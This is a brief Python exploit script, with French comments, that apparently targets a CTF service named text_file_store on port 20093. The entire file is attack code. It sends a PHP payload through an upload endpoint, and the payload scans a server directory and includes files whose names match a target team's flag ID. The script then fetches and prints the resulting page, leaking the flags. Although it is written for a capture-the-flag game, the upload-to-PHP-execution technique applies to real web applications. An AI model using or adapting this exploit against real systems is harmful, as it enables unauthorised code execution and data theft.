#!/usr/bin/python
# -*- coding: utf-8 -*-

# Exploit du service text_file_store
import sys
from lxml import html
import requests

if len(sys.argv) != 3 :
    print("Exploit du service text_file_store\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20093

payload = {"text": """<?php
$dir = '/opt/ctf/text_file_store/rw/';
$files = scandir($dir);
$target_files = preg_grep('#^"""+target+"""_#', $files);
foreach ($target_files as $target_file){
 include($target_file);
}
?>
"""}

upload_resp = requests.get('http://'+host+':20093/uploadFile.php', params=payload)
upload_tree = html.fromstring(upload_resp.content)
flag_link = upload_tree.xpath('//a/@href')[0]
viewfile_resp = requests.get('http://'+host+':20093/'+flag_link)

print(viewfile_resp.text)
